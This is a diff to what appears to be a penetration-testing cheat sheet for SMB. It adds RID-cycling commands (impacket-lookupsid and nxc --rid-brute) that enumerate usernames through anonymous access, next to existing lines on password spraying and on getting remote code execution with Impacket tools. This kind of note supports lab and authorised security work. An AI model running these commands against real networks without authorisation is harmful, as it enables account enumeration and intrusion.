@@ -101,6 +101,18 @@ nxc smb <ip> -u <path_to_usernamelist> -p '<password>' --continue-on-success #pa
 
 Post Exploit / Credential Gathering:
 
+If we are able to list share in an anonymous manner, that usually means we can start list username by doing RID Cycling:
+
+RID Cycling with Impacket-lookupsid:
+```
+impacket-lookupsid anonymous@<ip> -no-pass
+```
+
+RID Cycling with nxc:
+```
+nxc smb <ip> -u 'anonymous' -p '' --rid-brute
+```
+
 After we have gained valid credentials with admin right, we can archive RCE by using impacket-PsExec, impacket-SMBExec, Impacket-atexec or netexec:
 
 Impacket-series(preferred):
